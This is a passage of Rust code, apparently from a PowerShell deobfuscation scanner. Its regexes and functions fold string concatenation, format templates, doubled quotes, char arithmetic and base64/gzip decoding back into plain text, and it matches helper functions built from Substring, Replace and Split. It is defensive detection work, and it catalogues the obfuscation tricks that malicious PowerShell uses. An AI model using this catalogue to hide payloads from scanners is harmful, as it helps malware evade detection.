                start = i + 1;
            }
            _ => {}
        }
        i += 1;
    }
    let term = expr[start..].trim();
    if term.is_empty() {
        return None;
    }
    acc += sign * i64::from(parse_ps_char_codepoint_atom(term)?);
    if saw_operator && (0..=i64::from(u32::MAX)).contains(&acc) {
        Some(acc as u32)
    } else {
        None
    }
}

fn parse_ps_char_codepoint_atom(expr: &str) -> Option<u32> {
    let expr = expr.trim();
    if let Some(stripped) = expr.strip_prefix("0x").or_else(|| expr.strip_prefix("0X")) {
        u32::from_str_radix(stripped, 16).ok()
    } else {
        expr.parse().ok()
    }
}

#[allow(clippy::expect_used)]
static STR_CONCAT_RE: Lazy<Regex> = Lazy::new(|| {
    // Match runs of (quoted-string + )+ quoted-string.
    Regex::new(r#"(?:'(?:[^'\\]|\\.)*'\s*\+\s*)+'(?:[^'\\]|\\.)*'"#).expect("str concat regex")
});

#[allow(clippy::expect_used)]
static STR_PART_RE: Lazy<Regex> =
    Lazy::new(|| Regex::new(r#"'((?:[^'\\]|\\.)*)'"#).expect("string part regex"));

fn expand_string_concat(text: &str) -> String {
    let matches: Vec<(usize, usize, String)> = STR_CONCAT_RE
        .find_iter(text)
        .filter_map(|m| {
            if !is_string_concat_start(text, m.start()) {
                return None;
            }
            let s = m.as_str();
            let mut combined = String::new();
            for cap in STR_PART_RE.captures_iter(s) {
                let part_str = cap.get(1)?.as_str();
                combined.push_str(part_str);
            }
            Some((m.start(), m.end(), format!("'{}'", combined)))
        })
        .collect();
    let mut result = text.to_string();
    for (start, end, replacement) in matches.into_iter().rev() {
        result.replace_range(start..end, &replacement);
    }
    result
}

#[allow(clippy::expect_used)]
static PAREN_STR_CONCAT_RE: Lazy<Regex> = Lazy::new(|| {
    Regex::new(r#"(?:\(\s*'(?:[^'\\]|\\.)*'\s*\)\s*\+\s*)+\(\s*'(?:[^'\\]|\\.)*'\s*\)"#)
        .expect("parenthesized str concat regex")
});

fn expand_parenthesized_string_concat(text: &str) -> String {
    let matches: Vec<(usize, usize, String)> = PAREN_STR_CONCAT_RE
        .find_iter(text)
        .filter_map(|m| {
            if !is_string_concat_start(text, m.start()) {
                return None;
            }
            let mut combined = String::new();
            for cap in STR_PART_RE.captures_iter(m.as_str()) {
                combined.push_str(cap.get(1)?.as_str());
            }
            Some((m.start(), m.end(), format!("'{}'", combined)))
        })
        .collect();
    let mut result = text.to_string();
    for (start, end, replacement) in matches.into_iter().rev() {
        result.replace_range(start..end, &replacement);
    }
    result
}

fn expand_mixed_static_string_concat(text: &str) -> String {
    let bytes = text.as_bytes();
    let mut matches = Vec::new();
    let mut pos = 0usize;
    while pos < text.len() {
        let Some((first_end, first_value)) = parse_ps_concat_literal_term(text, pos) else {
            pos += 1;
            continue;
        };
        if !is_string_concat_start(text, pos) {
            pos = first_end;
            continue;
        }

        let mut values = vec![first_value];
        let mut end = first_end;
        loop {
            let plus_pos = skip_ascii_ws(bytes, end);
            if bytes.get(plus_pos) != Some(&b'+') {
                break;
            }
            let next_pos = skip_ascii_ws(bytes, plus_pos + 1);
            let Some((next_end, next_value)) = parse_ps_concat_literal_term(text, next_pos) else {
                break;
            };
            values.push(next_value);
            end = next_end;
        }

        if values.len() >= 2 {
            let joined = values.join("");
            if joined.len() <= 8192 {
                matches.push((pos, end, format!("'{}'", joined.replace('\'', "''"))));
            }
            pos = end;
        } else {
            pos = first_end;
        }
    }

    let mut result = text.to_string();
    for (start, end, replacement) in matches.into_iter().rev() {
        result.replace_range(start..end, &replacement);
    }
    result
}

fn parse_ps_concat_literal_term(text: &str, pos: usize) -> Option<(usize, String)> {
    let bytes = text.as_bytes();
    match bytes.get(pos).copied()? {
        b'\'' | b'"' => parse_ps_static_quoted_literal(text, pos),
        b'(' => {
            let literal_start = skip_ascii_ws(bytes, pos + 1);
            let (literal_end, value) = parse_ps_static_quoted_literal(text, literal_start)?;
            let close = skip_ascii_ws(bytes, literal_end);
            (bytes.get(close) == Some(&b')')).then_some((close + 1, value))
        }
        _ => None,
    }
}

#[allow(clippy::expect_used)]
static DQ_STR_CONCAT_RE: Lazy<Regex> = Lazy::new(|| {
    Regex::new(r#"(?:\"(?:[^\"\\]|\\.)*\"\s*\+\s*)+\"(?:[^\"\\]|\\.)*\""#)
        .expect("double quoted str concat regex")
});

#[allow(clippy::expect_used)]
static DQ_STR_PART_RE: Lazy<Regex> =
    Lazy::new(|| Regex::new(r#"\"((?:[^\"\\]|\\.)*)\""#).expect("double string part regex"));

fn expand_double_string_concat(text: &str) -> String {
    let matches: Vec<(usize, usize, String)> = DQ_STR_CONCAT_RE
        .find_iter(text)
        .filter_map(|m| {
            if !is_string_concat_start(text, m.start()) {
                return None;
            }
            let s = m.as_str();
            let mut combined = String::new();
            for cap in DQ_STR_PART_RE.captures_iter(s) {
                combined.push_str(cap.get(1)?.as_str());
            }
            Some((m.start(), m.end(), format!("'{}'", combined)))
        })
        .collect();
    let mut result = text.to_string();
    for (start, end, replacement) in matches.into_iter().rev() {
        result.replace_range(start..end, &replacement);
    }
    result
}

fn is_string_concat_start(text: &str, pos: usize) -> bool {
    match previous_non_whitespace(text, pos) {
        None => true,
        Some(c) => matches!(c, '=' | '(' | '[' | '{' | ',' | ';' | ':' | '?' | '+'),
    }
}

fn expand_doubled_quote_literals(text: &str) -> String {
    let bytes = text.as_bytes();
    let mut out = String::with_capacity(text.len());
    let mut cursor = 0usize;

    while let Some(rel) = text[cursor..].find("''") {
        let start = cursor + rel;
        let inner_start = start + 2;
        let limit = inner_start.saturating_add(8192).min(text.len());
        let mut end = inner_start;
        while end < limit {
            match bytes[end] {
                b'\'' | b'\r' | b'\n' => break,
                _ => end += 1,
            }
        }

        if end > inner_start && bytes.get(end..end + 2) == Some(b"''") {
            out.push_str(&text[cursor..start]);
            out.push('\'');
            out.push_str(&text[inner_start..end]);
            out.push('\'');
            cursor = end + 2;
        } else {
            out.push_str(&text[cursor..start + 1]);
            cursor = start + 1;
        }
    }
    out.push_str(&text[cursor..]);
    out
}

#[allow(clippy::expect_used)]
static FORMAT_LITERAL_RE: Lazy<Regex> = Lazy::new(|| {
    Regex::new(
        r#"\(?\s*(?:'([^']*)'|"([^"]*)")\s*\)?\s*-f\s*((?:(?:'[^']*'|"[^"]*")\s*,\s*)*(?:'[^']*'|"[^"]*"))"#,
    )
        .expect("format literal")
});

#[allow(clippy::expect_used)]
static FORMAT_CONCAT_LITERAL_RE: Lazy<Regex> = Lazy::new(|| {
    Regex::new(r#"\(?\s*((?:'[^']*'\s*\+\s*)+'[^']*')\s*\)?\s*-f\s*((?:'[^']*'\s*,\s*)*'[^']*')"#)
        .expect("format concat literal")
});

#[allow(clippy::expect_used)]
static FORMAT_ARG_RE: Lazy<Regex> =
    Lazy::new(|| Regex::new(r#"'([^']*)'|"([^"]*)""#).expect("format arg literal"));

#[allow(clippy::expect_used)]
static STRING_FORMAT_RE: Lazy<Regex> = Lazy::new(|| {
    Regex::new(
        r#"(?is)\[(?:System\.)?String\]::Format\s*\(\s*(?:'([^']*)'|"([^"]*)")\s*,\s*((?:(?:'[^']*'|"[^"]*")\s*,\s*)*(?:'[^']*'|"[^"]*"))\s*\)"#,
    )
    .expect("string format")
});

fn expand_format_literals(text: &str) -> String {
    let concat_matches: Vec<(usize, usize, String)> = FORMAT_CONCAT_LITERAL_RE
        .captures_iter(text)
        .filter_map(|caps| {
            let full = caps.get(0)?;
            let template_parts = caps.get(1)?.as_str();
            let mut template = String::new();
            for part in STR_PART_RE.captures_iter(template_parts) {
                template.push_str(part.get(1)?.as_str());
            }
            let args = caps.get(2)?.as_str();
            Some((
                full.start(),
                full.end(),
                format_format_literal(template, args)?,
            ))
        })
        .collect();
    let mut out = text.to_string();
    for (start, end, replacement) in concat_matches.into_iter().rev() {
        out.replace_range(start..end, &replacement);
    }

    let matches: Vec<(usize, usize, String)> = FORMAT_LITERAL_RE
        .captures_iter(text)
        .filter_map(|caps| {
            let full = caps.get(0)?;
            let template = caps
                .get(1)
                .or_else(|| caps.get(2))
                .map(|m| m.as_str().to_string())?;
            let args = caps.get(3)?.as_str();
            let before = text[..full.start()].trim_end();
            if before.ends_with('+') {
                return None;
            }
            Some((
                full.start(),
                full.end(),
                format_format_literal(template, args)?,
            ))
        })
        .collect();
    for (start, end, replacement) in matches.into_iter().rev() {
        out.replace_range(start..end, &replacement);
    }
    out
}

fn format_format_literal(template: String, args: &str) -> Option<String> {
    let template = format_format_literal_value(template, args)?;
    Some(format!("'{}'", template))
}

fn format_format_literal_value(mut template: String, args: &str) -> Option<String> {
    let mut arg_count = 0usize;
    for (idx, part) in FORMAT_ARG_RE.captures_iter(args).enumerate() {
        arg_count += 1;
        if arg_count > 128 {
            return None;
        }
        let value = part.get(1).or_else(|| part.get(2))?.as_str();
        template = template.replace(&format!("{{{idx}}}"), value);
        if template.len() > 8192 {
            return None;
        }
    }
    Some(template)
}

fn expand_ps_string_format_static(text: &str) -> String {
    let matches: Vec<(usize, usize, String)> = STRING_FORMAT_RE
        .captures_iter(text)
        .filter_map(|caps| {
            let full = caps.get(0)?;
            let template = caps.get(1).or_else(|| caps.get(2))?.as_str();
            if template.len() > 8192 {
                return None;
            }
            let args = caps.get(3)?.as_str();
            let formatted = format_format_literal_value(template.to_string(), args)?;
            Some((
                full.start(),
                full.end(),
                format!("'{}'", formatted.replace('\'', "''")),
            ))
        })
        .collect();
    let mut out = text.to_string();
    for (start, end, replacement) in matches.into_iter().rev() {
        out.replace_range(start..end, &replacement);
    }
    out
}

#[allow(clippy::expect_used)]
static B64_LITERAL_RE: Lazy<Regex> = Lazy::new(|| {
    Regex::new(
        r#"(?i)\[(?:System\.)?Convert\]::FromBase64String\s*\(\s*['"]([A-Za-z0-9+/=]+)['"]\s*\)"#,
    )
    .expect("b64 literal regex")
});

#[allow(clippy::expect_used)]
static GETSTRING_B64_LITERAL_RE: Lazy<Regex> = Lazy::new(|| {
    Regex::new(
        r#"(?i)\[(?:System\.)?(?:Text\.)?Encoding\]::(UTF8|ASCII|Unicode|UTF7|BigEndianUnicode|UTF32)\.GetString\s*\(\s*\[(?:System\.)?Convert\]::FromBase64String\s*\(\s*\(*\s*['"]([A-Za-z0-9+/=\s]+)['"]\s*(?:\.\s*Trim(?:Start|End)?\s*\(\s*\))?\s*\)*\s*\)\s*\)"#,
    )
    .expect("getstring b64 literal regex")
});

#[allow(clippy::expect_used)]
static GETSTRING_B64_VAR_RE: Lazy<Regex> = Lazy::new(|| {
    Regex::new(
        r#"(?i)\[(?:System\.)?(?:Text\.)?Encoding\]::(UTF8|ASCII|Unicode|UTF7|BigEndianUnicode|UTF32)\.GetString\s*\(\s*\[(?:System\.)?Convert\]::FromBase64String\s*\(\s*\(*\s*\$([A-Za-z_][A-Za-z0-9_]*)\s*(?:\.\s*Trim(?:Start|End)?\s*\(\s*\))?\s*\)*\s*\)\s*\)"#,
    )
    .expect("getstring b64 var regex")
});

#[allow(clippy::expect_used)]
static GETSTRING_BYTE_ARRAY_RE: Lazy<Regex> = Lazy::new(|| {
    Regex::new(
        r#"(?i)\[(?:System\.)?(?:Text\.)?Encoding\]::(UTF8|ASCII|Unicode|UTF7|BigEndianUnicode|UTF32)\.GetString\s*\(\s*\[\s*byte\s*\[\]\s*\]\s*@?\(\s*((?:0x[0-9a-f]+|\d+)\s*(?:,\s*(?:0x[0-9a-f]+|\d+)\s*){3,})\)\s*\)"#,
    )
    .expect("getstring byte array regex")
});

#[allow(clippy::expect_used)]
static FROMB64_LONG_LITERAL_RE: Lazy<Regex> = Lazy::new(|| {
    Regex::new(r#"(?i)FromBase64String\s*\(\s*['"]([A-Za-z0-9+/=]{40,})['"]"#)
        .expect("long frombase64 literal regex")
});

#[allow(clippy::expect_used)]
static GZIP_B64_LITERAL_RE: Lazy<Regex> = Lazy::new(|| {
    Regex::new(
        r#"(?i)\[(?:System\.)?Convert\]::FromBase64String\s*\(\s*\(*\s*['"]([A-Za-z0-9+/=]+)['"]\s*\)*\s*\)"#,
    )
    .expect("gzip b64 literal regex")
});

#[allow(clippy::expect_used)]
static PS_LONG_B64_VAR_ASSIGN_RE: Lazy<Regex> = Lazy::new(|| {
    Regex::new(r#"(?is)\$([A-Za-z_][A-Za-z0-9_]*)\s*=\s*["']([A-Za-z0-9+/=]{256,})["']"#)
        .expect("ps long b64 var assign regex")
});

#[allow(clippy::expect_used)]
static PS_FUNCTION_DEF_RE: Lazy<Regex> = Lazy::new(|| {
    Regex::new(
        r#"(?i)\bfunction\s+(?:(?:global|script|local|private):)?([A-Za-z_][A-Za-z0-9_]*(?:-[A-Za-z0-9_]+)*)\b"#,
    )
        .expect("ps function def regex")
});

#[allow(clippy::expect_used)]
static PS_ITEM_FUNCTION_DEF_RE: Lazy<Regex> = Lazy::new(|| {
    Regex::new(r#"(?is)\b(?:New-Item|n`?i|Set-Item|s`?i)\b([^{}]{0,512})\{"#)
        .expect("ps item function def regex")
});

#[allow(clippy::expect_used)]
static PS_ITEM_FUNCTION_PATH_RE: Lazy<Regex> = Lazy::new(|| {
    Regex::new(r#"(?i)(?:^|[\s,;])(?:-(?:p|path)\s+)?['"]?function:"#)
        .expect("ps item function path regex")
});

#[allow(clippy::expect_used)]
static PS_ITEM_FUNCTION_NAME_RE: Lazy<Regex> = Lazy::new(|| {
    Regex::new(
        r#"(?i)(?:^|[\s,;])-(?:n|name)\s+['"]?([A-Za-z_][A-Za-z0-9_]*(?:-[A-Za-z0-9_]+)*)['"]?"#,
    )
    .expect("ps item function name regex")
});

#[allow(clippy::expect_used)]
static PS_ITEM_FUNCTION_PATH_NAME_RE: Lazy<Regex> = Lazy::new(|| {
    Regex::new(
        r#"(?i)(?:^|[\s,;])(?:-(?:p|path)\s+)?['"]?function:[\\/]*([A-Za-z_][A-Za-z0-9_]*(?:-[A-Za-z0-9_]+)*)['"]?"#,
    )
    .expect("ps item function path-name regex")
});

#[allow(clippy::expect_used)]
static PS_ITEM_FUNCTION_VALUE_RE: Lazy<Regex> = Lazy::new(|| {
    Regex::new(r#"(?i)(?:^|[\s,;])-(?:val|value)\b"#).expect("ps item function value regex")
});

#[allow(clippy::expect_used)]
static PS_LITERAL_SUBSTRING_EXTRACTOR_BODY_RE: Lazy<Regex> = Lazy::new(|| {
    Regex::new(
        r#"(?is)(?:\breturn\s+)?(?:\(\s*)?\$([A-Za-z_][A-Za-z0-9_]*)\s*(?:\)\s*)?\.\s*Substring\s*\(\s*\$([A-Za-z_][A-Za-z0-9_]*)\s*,\s*\$([A-Za-z_][A-Za-z0-9_]*)\s*\)"#,
    )
    .expect("ps literal substring extractor body regex")
});

#[allow(clippy::expect_used)]
static PS_LITERAL_TAIL_SUBSTRING_EXTRACTOR_BODY_RE: Lazy<Regex> = Lazy::new(|| {
    Regex::new(
        r#"(?is)(?:\breturn\s+)?(?:\(\s*)?\$([A-Za-z_][A-Za-z0-9_]*)\s*(?:\)\s*)?\.\s*Substring\s*\(\s*\$([A-Za-z_][A-Za-z0-9_]*)\s*\)"#,
    )
    .expect("ps literal tail substring extractor body regex")
});

#[allow(clippy::expect_used)]
static PS_LITERAL_CONST_SUBSTRING_EXTRACTOR_BODY_RE: Lazy<Regex> = Lazy::new(|| {
    Regex::new(
        r#"(?is)(?:\breturn\s+)?(?:\(\s*)?\$([A-Za-z_][A-Za-z0-9_]*)\s*(?:\)\s*)?\.\s*Substring\s*\(\s*(\d{1,6})(?:\s*,\s*(\d{1,6}))?\s*\)"#,
    )
    .expect("ps literal const substring extractor body regex")
});

#[allow(clippy::expect_used)]
static PS_LITERAL_REMOVE_EXTRACTOR_BODY_RE: Lazy<Regex> = Lazy::new(|| {
    Regex::new(
        r#"(?is)(?:\breturn\s+)?(?:\(\s*)?\$([A-Za-z_][A-Za-z0-9_]*)\s*(?:\)\s*)?\.\s*Remove\s*\(\s*\$([A-Za-z_][A-Za-z0-9_]*)(?:\s*,\s*\$([A-Za-z_][A-Za-z0-9_]*))?\s*\)"#,
    )
    .expect("ps literal remove extractor body regex")
});

#[allow(clippy::expect_used)]
static PS_LITERAL_CONST_REMOVE_EXTRACTOR_BODY_RE: Lazy<Regex> = Lazy::new(|| {
    Regex::new(
        r#"(?is)(?:\breturn\s+)?(?:\(\s*)?\$([A-Za-z_][A-Za-z0-9_]*)\s*(?:\)\s*)?\.\s*Remove\s*\(\s*(\d{1,6})(?:\s*,\s*(\d{1,6}))?\s*\)"#,
    )
    .expect("ps literal const remove extractor body regex")
});

#[allow(clippy::expect_used)]
static PS_LITERAL_INSERT_EXTRACTOR_BODY_RE: Lazy<Regex> = Lazy::new(|| {
    Regex::new(
        r#"(?is)(?:\breturn\s+)?(?:\(\s*)?\$([A-Za-z_][A-Za-z0-9_]*)\s*(?:\)\s*)?\.\s*Insert\s*\(\s*\$([A-Za-z_][A-Za-z0-9_]*)\s*,\s*\$([A-Za-z_][A-Za-z0-9_]*)\s*\)"#,
    )
    .expect("ps literal insert extractor body regex")
});

#[allow(clippy::expect_used)]
static PS_LITERAL_CONST_INSERT_EXTRACTOR_BODY_RE: Lazy<Regex> = Lazy::new(|| {
    Regex::new(
        r#"(?is)(?:\breturn\s+)?(?:\(\s*)?\$([A-Za-z_][A-Za-z0-9_]*)\s*(?:\)\s*)?\.\s*Insert\s*\(\s*(\d{1,6})\s*,\s*((?:'(?:(?:'')|[^'])*')|(?:"(?:`.|[^"`$])*"))\s*\)"#,
    )
    .expect("ps literal const insert extractor body regex")
});

#[allow(clippy::expect_used)]
static PS_LITERAL_STRING_CASE_EXTRACTOR_BODY_RE: Lazy<Regex> = Lazy::new(|| {
    Regex::new(
        r#"(?is)(?:\breturn\s+)?(?:\(\s*)?\$([A-Za-z_][A-Za-z0-9_]*)\s*(?:\)\s*)?\.\s*(ToLower|ToUpper)\s*\(\s*\)"#,
    )
    .expect("ps literal string case extractor body regex")
});

#[allow(clippy::expect_used)]
static PS_LITERAL_CONCAT_EXTRACTOR_BODY_RE: Lazy<Regex> = Lazy::new(|| {
    Regex::new(
        r#"(?is)(?:\breturn\s+)?((?:\(\s*)?\$[A-Za-z_][A-Za-z0-9_]*\s*(?:\)\s*)?(?:\+\s*(?:\(\s*)?\$[A-Za-z_][A-Za-z0-9_]*\s*(?:\)\s*)?){1,7})"#,
    )
    .expect("ps literal concat extractor body regex")
});

#[allow(clippy::expect_used)]
static PS_LITERAL_CONCAT_VAR_RE: Lazy<Regex> =
    Lazy::new(|| Regex::new(r#"\$([A-Za-z_][A-Za-z0-9_]*)"#).expect("ps literal concat var regex"));

#[allow(clippy::expect_used)]
static PS_LITERAL_STRING_CONCAT_EXTRACTOR_BODY_RE: Lazy<Regex> = Lazy::new(|| {
    Regex::new(
        r#"(?is)(?:\breturn\s+)?\[(?:System\.)?String\]::Concat\s*\(\s*(?:@?\(\s*)?((?:\$[A-Za-z_][A-Za-z0-9_]*\s*,\s*){1,7}\$[A-Za-z_][A-Za-z0-9_]*)\s*(?:\))?\s*\)"#,
    )
    .expect("ps literal string concat extractor body regex")
});

#[allow(clippy::expect_used)]
static PS_LITERAL_STRING_JOIN_EXTRACTOR_BODY_RE: Lazy<Regex> = Lazy::new(|| {
    Regex::new(
        r#"(?is)(?:\breturn\s+)?\[(?:System\.)?String\]::Join\s*\(\s*((?:'(?:(?:'')|[^'])*')|(?:"(?:`.|[^"`$])*"))\s*,\s*@?\(\s*((?:\$[A-Za-z_][A-Za-z0-9_]*\s*,\s*){1,7}\$[A-Za-z_][A-Za-z0-9_]*)\s*\)\s*\)"#,
    )
    .expect("ps literal string join extractor body regex")
});

#[allow(clippy::expect_used)]
static PS_LITERAL_FORMAT_EXTRACTOR_BODY_RE: Lazy<Regex> = Lazy::new(|| {
    Regex::new(
        r#"(?is)(?:\breturn\s+)?((?:'(?:(?:'')|[^'])*')|(?:"(?:`.|[^"`$])*"))\s*-f\s*(?:@?\(\s*)?((?:\$[A-Za-z_][A-Za-z0-9_]*\s*,\s*){1,7}\$[A-Za-z_][A-Za-z0-9_]*)\s*(?:\))?"#,
    )
    .expect("ps literal format extractor body regex")
});

#[allow(clippy::expect_used)]
static PS_LITERAL_STRING_FORMAT_EXTRACTOR_BODY_RE: Lazy<Regex> = Lazy::new(|| {
    Regex::new(
        r#"(?is)(?:\breturn\s+)?\[(?:System\.)?String\]::Format\s*\(\s*((?:'(?:(?:'')|[^'])*')|(?:"(?:`.|[^"`$])*"))\s*,\s*(?:@?\(\s*)?((?:\$[A-Za-z_][A-Za-z0-9_]*\s*,\s*){1,7}\$[A-Za-z_][A-Za-z0-9_]*)\s*(?:\))?\s*\)"#,
    )
    .expect("ps literal string format extractor body regex")
});

#[allow(clippy::expect_used)]
static PS_LITERAL_INDEX_EXTRACTOR_BODY_RE: Lazy<Regex> = Lazy::new(|| {
    Regex::new(
        r#"(?is)(?:\breturn\s+)?(?:\(\s*)?\$([A-Za-z_][A-Za-z0-9_]*)\s*(?:\)\s*)?\[\s*\$([A-Za-z_][A-Za-z0-9_]*)\s*\]"#,
    )
    .expect("ps literal index extractor body regex")
});

#[allow(clippy::expect_used)]
static PS_LITERAL_CONST_INDEX_EXTRACTOR_BODY_RE: Lazy<Regex> = Lazy::new(|| {
    Regex::new(
        r#"(?is)(?:\breturn\s+)?(?:\(\s*)?\$([A-Za-z_][A-Za-z0-9_]*)\s*(?:\)\s*)?\[\s*(\d{1,6})\s*\]"#,
    )
    .expect("ps literal const index extractor body regex")
});

#[allow(clippy::expect_used)]
static PS_LITERAL_CONST_CHARS_EXTRACTOR_BODY_RE: Lazy<Regex> = Lazy::new(|| {
    Regex::new(
        r#"(?is)(?:\breturn\s+)?(?:\(\s*)?\$([A-Za-z_][A-Za-z0-9_]*)\s*(?:\)\s*)?\.\s*(?:get_)?Chars\s*\(\s*(\d{1,6})\s*\)"#,
    )
    .expect("ps literal const Chars/get_Chars extractor body regex")
});

#[allow(clippy::expect_used)]
static PS_LITERAL_CONST_TOCHARARRAY_INDEX_EXTRACTOR_BODY_RE: Lazy<Regex> = Lazy::new(|| {
    Regex::new(
        r#"(?is)(?:\breturn\s+)?(?:\(\s*)?\$([A-Za-z_][A-Za-z0-9_]*)\s*(?:\)\s*)?\.\s*ToCharArray\s*\(\s*\)\s*\[\s*(\d{1,6})\s*\]"#,
    )
    .expect("ps literal const ToCharArray index extractor body regex")
});

#[allow(clippy::expect_used)]
static PS_LITERAL_CHARS_EXTRACTOR_BODY_RE: Lazy<Regex> = Lazy::new(|| {
    Regex::new(
        r#"(?is)(?:\breturn\s+)?(?:\(\s*)?\$([A-Za-z_][A-Za-z0-9_]*)\s*(?:\)\s*)?\.\s*(?:get_)?Chars\s*\(\s*\$([A-Za-z_][A-Za-z0-9_]*)\s*\)"#,
    )
    .expect("ps literal Chars/get_Chars extractor body regex")
});

#[allow(clippy::expect_used)]
static PS_LITERAL_TOCHARARRAY_INDEX_EXTRACTOR_BODY_RE: Lazy<Regex> = Lazy::new(|| {
    Regex::new(
        r#"(?is)(?:\breturn\s+)?(?:\(\s*)?\$([A-Za-z_][A-Za-z0-9_]*)\s*(?:\)\s*)?\.\s*ToCharArray\s*\(\s*\)\s*\[\s*\$([A-Za-z_][A-Za-z0-9_]*)\s*\]"#,
    )
    .expect("ps literal ToCharArray index extractor body regex")
});

#[allow(clippy::expect_used)]
static PS_LITERAL_REPLACE_EXTRACTOR_BODY_RE: Lazy<Regex> = Lazy::new(|| {
    Regex::new(
        r#"(?is)(?:\breturn\s+)?(?:\(\s*)?\$([A-Za-z_][A-Za-z0-9_]*)\s*(?:\)\s*)?-(?:[ic])?replace\s+\$([A-Za-z_][A-Za-z0-9_]*)\s*,\s*\$([A-Za-z_][A-Za-z0-9_]*)"#,
    )
    .expect("ps literal replace extractor body regex")
});

#[allow(clippy::expect_used)]
static PS_LITERAL_CONST_REPLACE_EXTRACTOR_BODY_RE: Lazy<Regex> = Lazy::new(|| {
    Regex::new(
        r#"(?is)(?:\breturn\s+)?(?:\(\s*)?\$([A-Za-z_][A-Za-z0-9_]*)\s*(?:\)\s*)?-(?:[ic])?replace\s+((?:'(?:(?:'')|[^'])*')|(?:"(?:`.|[^"`$])*"))\s*,\s*((?:'(?:(?:'')|[^'])*')|(?:"(?:`.|[^"`$])*"))"#,
    )
    .expect("ps literal const replace extractor body regex")
});

#[allow(clippy::expect_used)]
static PS_LITERAL_DOT_REPLACE_EXTRACTOR_BODY_RE: Lazy<Regex> = Lazy::new(|| {
    Regex::new(
        r#"(?is)(?:\breturn\s+)?(?:\(\s*)?\$([A-Za-z_][A-Za-z0-9_]*)\s*(?:\)\s*)?\.\s*Replace\s*\(\s*\$([A-Za-z_][A-Za-z0-9_]*)\s*,\s*\$([A-Za-z_][A-Za-z0-9_]*)\s*\)"#,
    )
    .expect("ps literal dot replace extractor body regex")
});

#[allow(clippy::expect_used)]
static PS_LITERAL_CONST_DOT_REPLACE_EXTRACTOR_BODY_RE: Lazy<Regex> = Lazy::new(|| {
    Regex::new(
        r#"(?is)(?:\breturn\s+)?(?:\(\s*)?\$([A-Za-z_][A-Za-z0-9_]*)\s*(?:\)\s*)?\.\s*Replace\s*\(\s*((?:'(?:(?:'')|[^'])*')|(?:"(?:`.|[^"`$])*"))\s*,\s*((?:'(?:(?:'')|[^'])*')|(?:"(?:`.|[^"`$])*"))\s*\)"#,
    )
    .expect("ps literal const dot replace extractor body regex")
});

#[allow(clippy::expect_used)]
static PS_LITERAL_TRIM_EXTRACTOR_BODY_RE: Lazy<Regex> = Lazy::new(|| {
    Regex::new(
        r#"(?is)(?:\breturn\s+)?(?:\(\s*)?\$([A-Za-z_][A-Za-z0-9_]*)\s*(?:\)\s*)?\.\s*(Trim(?:Start|End)?)\s*\(\s*(?:\$([A-Za-z_][A-Za-z0-9_]*))?\s*\)"#,
    )
    .expect("ps literal trim extractor body regex")
});

#[allow(clippy::expect_used)]
static PS_LITERAL_CONST_TRIM_EXTRACTOR_BODY_RE: Lazy<Regex> = Lazy::new(|| {
    Regex::new(
        r#"(?is)(?:\breturn\s+)?(?:\(\s*)?\$([A-Za-z_][A-Za-z0-9_]*)\s*(?:\)\s*)?\.\s*(Trim(?:Start|End)?)\s*\(\s*((?:'(?:(?:'')|[^'])*')|(?:"(?:`.|[^"`$])*"))\s*\)"#,
    )
    .expect("ps literal const trim extractor body regex")
});

#[allow(clippy::expect_used)]
static PS_LITERAL_SPLIT_INDEX_EXTRACTOR_BODY_RE: Lazy<Regex> = Lazy::new(|| {
    Regex::new(
        r#"(?is)(?:\breturn\s+)?(?:\(\s*)?\$([A-Za-z_][A-Za-z0-9_]*)\s*(?:\)\s*)?\.\s*Split\s*\(\s*\$([A-Za-z_][A-Za-z0-9_]*)\s*\)\s*\[\s*\$([A-Za-z_][A-Za-z0-9_]*)\s*\]"#,
    )
    .expect("ps literal split index extractor body regex")
});

#[allow(clippy::expect_used)]
static PS_LITERAL_CONST_SPLIT_INDEX_EXTRACTOR_BODY_RE: Lazy<Regex> = Lazy::new(|| {
    Regex::new(
        r#"(?is)(?:\breturn\s+)?(?:\(\s*)?\$([A-Za-z_][A-Za-z0-9_]*)\s*(?:\)\s*)?\.\s*Split\s*\(\s*((?:'(?:(?:'')|[^'])*')|(?:"(?:`.|[^"`$])*"))\s*\)\s*\[\s*(\d{1,6})\s*\]"#,
    )
    .expect("ps literal const split index extractor body regex")
});

#[allow(clippy::expect_used)]
static PS_LITERAL_CONST_SEP_SPLIT_INDEX_EXTRACTOR_BODY_RE: Lazy<Regex> = Lazy::new(|| {
    Regex::new(
        r#"(?is)(?:\breturn\s+)?(?:\(\s*)?\$([A-Za-z_][A-Za-z0-9_]*)\s*(?:\)\s*)?\.\s*Split\s*\(\s*((?:'(?:(?:'')|[^'])*')|(?:"(?:`.|[^"`$])*"))\s*\)\s*\[\s*\$([A-Za-z_][A-Za-z0-9_]*)\s*\]"#,
    )
    .expect("ps literal const-separator split index extractor body regex")
});

#[allow(clippy::expect_used)]
static PS_LITERAL_CONST_SPLIT_OPERATOR_INDEX_EXTRACTOR_BODY_RE: Lazy<Regex> = Lazy::new(|| {
    Regex::new(
        r#"(?is)(?:\breturn\s+)?\(?\s*(?:\(\s*)?\$([A-Za-z_][A-Za-z0-9_]*)\s*(?:\)\s*)?-(?:[ic])?split\s+((?:'(?:(?:'')|[^'])*')|(?:"(?:`.|[^"`$])*"))\s*\)?\s*\[\s*(\d{1,6})\s*\]"#,
    )
    .expect("ps literal const split operator index extractor body regex")
});

#[allow(clippy::expect_used)]
static PS_LITERAL_SPLIT_OPERATOR_INDEX_EXTRACTOR_BODY_RE: Lazy<Regex> = Lazy::new(|| {
    Regex::new(
        r#"(?is)(?:\breturn\s+)?\(?\s*(?:\(\s*)?\$([A-Za-z_][A-Za-z0-9_]*)\s*(?:\)\s*)?-(?:[ic])?split\s+\$([A-Za-z_][A-Za-z0-9_]*)\s*\)?\s*\[\s*\$([A-Za-z_][A-Za-z0-9_]*)\s*\]"#,
    )
    .expect("ps literal split operator index extractor body regex")
});

#[allow(clippy::expect_used)]
static PS_GZIP_FUNCTION_GETSTRING_VAR_RE: Lazy<Regex> = Lazy::new(|| {
    Regex::new(
        r#"(?is)\$([A-Za-z_][A-Za-z0-9_]*)\s*=\s*\[(?:System\.)?(?:Text\.)?Encoding\]::(?:UTF8|ASCII|Unicode|UTF7|BigEndianUnicode|UTF32)\.GetString\s*\(\s*\(*\s*([A-Za-z_][A-Za-z0-9_]*)\s*\(\s*\(*\s*\[(?:System\.)?Convert\]::FromBase64String\s*\(\s*\$([A-Za-z_][A-Za-z0-9_]*)\s*\)\s*\)*\s*\)\s*\)*\s*\)\s*(?:\.TrimEnd\s*\([^)]*\))?"#,
    )
    .expect("ps gzip function getstring var regex")
});

#[allow(clippy::expect_used)]
